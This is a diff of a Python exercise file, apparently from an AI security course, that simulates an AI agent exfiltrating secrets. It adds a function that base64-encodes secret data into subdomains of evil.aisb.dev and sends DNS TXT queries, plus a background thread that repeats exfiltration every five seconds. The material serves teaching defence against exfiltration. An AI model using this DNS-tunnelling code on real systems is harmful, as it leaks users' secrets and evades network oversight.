@@ -9,6 +9,26 @@ from unittest.mock import patch, MagicMock
 
 import requests
 
+
+# %%
+if __name__ == "__main__":  # Only executed when running the script directly
+    # Make requests to the evil server with different secret data.
+    # This simulates an AI agent repeatedly trying to exfiltrate data.
+
+    def loop_exfiltration():
+        while True:
+            global exfiltrate_data
+            try:
+                time.sleep(5)
+                print(exfiltrate_data("some_secret_data"))
+            except KeyboardInterrupt:
+                print("Stopping exfiltration loop.")
+                break
+
+    import threading
+
+    thread = threading.Thread(target=loop_exfiltration)
+    thread.start()
 # %%
 
 """
@@ -166,29 +186,62 @@ def make_evil_request_ftp(secret_data: str) -> Optional[str]:
         return None
 
 
-from w1d2_test import test_make_evil_request_ftp
-
-test_make_evil_request_ftp(make_evil_request_ftp)
-
 exfiltrate_data = make_evil_request_ftp
 
 # %%
-if __name__ == "__main__":  # Only executed when running the script directly
-    # Make requests to the evil server with different secret data.
-    # This simulates an AI agent repeatedly trying to exfiltrate data.
 
-    def loop_exfiltration():
-        while True:
-            global exfiltrate_data
-            try:
-                time.sleep(5)
-                print(exfiltrate_data("some_secret_data"))
-            except KeyboardInterrupt:
-                print("Stopping exfiltration loop.")
-                break
 
-    import threading
+import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
 
-    thread = threading.Thread(target=loop_exfiltration)
-    thread.start()
-# %%
+resolver = dns_resolver.Resolver()
+resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+"""
+Send a DNS request to evil.aisb.dev to exfiltrate secret data.
+
+This simulates an AI agent attempting to communicate using DNS queries.
+
+Args:
+    secret_data: The secret information to exfiltrate
+
+Returns:
+    The response text from the DNS query, or None if the request fails
+"""
+
+import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
+
+resolver = dns_resolver.Resolver()
+resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+
+def make_evil_request_dns(secret_data: str) -> Optional[str]:
+    try:
+        # Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
+        encoded_data = base64.urlsafe_b64encode(secret_data.encode())
+        url = f"{encoded_data.decode()}.evil.aisb.dev"
+
+        # Perform a DNS query for TXT records using resolver.resolve
+        result = resolver.resolve(url, "TXT")
+
+        # Return the first TXT record found, or None if no records are found
+        return str(result[0].to_text()) if result else None
+
+    except dns_resolver.NoAnswer:
+        print("No answer received for DNS query")
+        return None
+
+    except dns_resolver.NXDOMAIN:
+        print("Domain does not exist")
+        return None
+
+    except Exception as e:
+        print(f"DNS failed: {e}")
+        return None
+
+
+from w1d2_test import test_make_evil_request_dns
+
+test_make_evil_request_dns(make_evil_request_dns, resolver)
+
+# Set the exfiltration function for use in the exercise
+exfiltrate_data = make_evil_request_dns
